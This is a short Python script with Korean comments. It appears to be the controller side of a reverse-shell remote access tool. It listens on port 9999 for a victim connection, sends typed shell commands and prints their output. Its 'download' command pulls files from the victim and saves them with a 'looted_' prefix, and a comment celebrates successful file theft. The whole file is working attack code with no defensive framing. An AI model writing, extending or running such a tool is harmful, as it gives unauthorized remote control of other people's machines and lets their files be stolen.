import socket

HOST = '0.0.0.0'
PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

print(f"[*] {PORT} 포트에서 연결 대기 중...")
conn, addr = s.accept()
print(f"[+] 연결됨: {addr}")

while True:
    try:
        command = input("Shell> ")
        
        if command == 'exit':
            conn.send('exit'.encode())
            break
        if command == '':
            continue
            
        # 명령어를 보냅니다. (한글 지원을 위해 cp949 인코딩 권장)
        conn.send(command.encode('cp949'))
        
        # [NEW] 만약 다운로드 명령이었다면? 특별 대우를 해줍니다.
        if command[:8] == 'download':
            # 파일 데이터 수신 (파일은 클 수 있으니 넉넉하게 1MB 정도 받음)
            file_data = conn.recv(1048576) 
            
            if file_data == "파일이 없습니다.".encode('cp949'):
                print("[-] 해당 파일이 존재하지 않습니다.")
            else:
                # 파일 저장 (이름 앞에 'looted_'를 붙여서 저장)
                filename = command[9:].strip()
                save_name = "looted_" + filename
                
                # 'wb'(Write Binary) 모드로 저장
                with open(save_name, "wb") as f:
                    f.write(file_data)
                print(f"[+] 파일 탈취 성공! 저장된 이름: {save_name}")
                
        else:
            # 일반 명령어 결과는 그냥 화면에 출력 (CP949 디코딩)
            result = conn.recv(4096).decode('cp949', errors='ignore')
            print(result)
            
    except Exception as e:
        print(f"[-] 에러 발생: {e}")
        break

conn.close()
s.close()